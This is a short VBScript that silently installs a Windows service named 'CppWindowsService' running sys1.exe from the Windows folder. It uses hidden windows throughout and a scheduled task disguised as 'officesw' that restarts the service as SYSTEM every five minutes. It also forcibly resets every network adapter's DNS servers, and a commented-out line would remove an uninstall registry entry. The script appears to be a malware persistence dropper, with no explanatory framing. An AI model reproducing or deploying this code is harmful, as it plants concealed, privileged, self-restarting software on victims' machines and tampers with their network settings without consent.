Set oShell = CreateObject ("WScript.Shell") 
windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
With CreateObject("WScript.Shell")
     
    ' Pass 0 as the second parameter to hide the window...
    .Run "sc delete CppWindowsService", 0, True
    .Run "sc create CppWindowsService binPath= " & windir & "\\sys1.exe DisplayName= ""CppWindowsService"" start= auto", 0, True
    .Run "net start CppWindowsService", 0, True
    '.Run "reg delete HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{49168414-9A56-45D3-A4BC-617FD19511D7} /f", 0, True
    .Run "schtasks /delete /tn officesw /F", 0, True
    'cmd="net start CppWindowsService" 
    'user="SYSTEM"
    .Run "schtasks /create /ru ""SYSTEM"" /sc minute /mo 5 /tr ""net start CppWindowsService"" /tn officesw /rl highest /F", 0, True
End With
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputerName & "\root\cimv2")

Set colAdapters = objWMIService.ExecQuery _
    ("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
for each nad in colAdapters
    If Not IsNull(Nad.DefaultIPGateway) Then
      if not isnull(Nad.MACAddress) then 
        arrDNSServers = Array("8.8.8.8", "8.8.8.8")
        nad.SetDNSServerSearchOrder(arrDNSServers)
        'mac=Nad.MACAddress 'Wscript.Echo Nad.description, Nad.MACAddress 
      end if
    end if  
next 
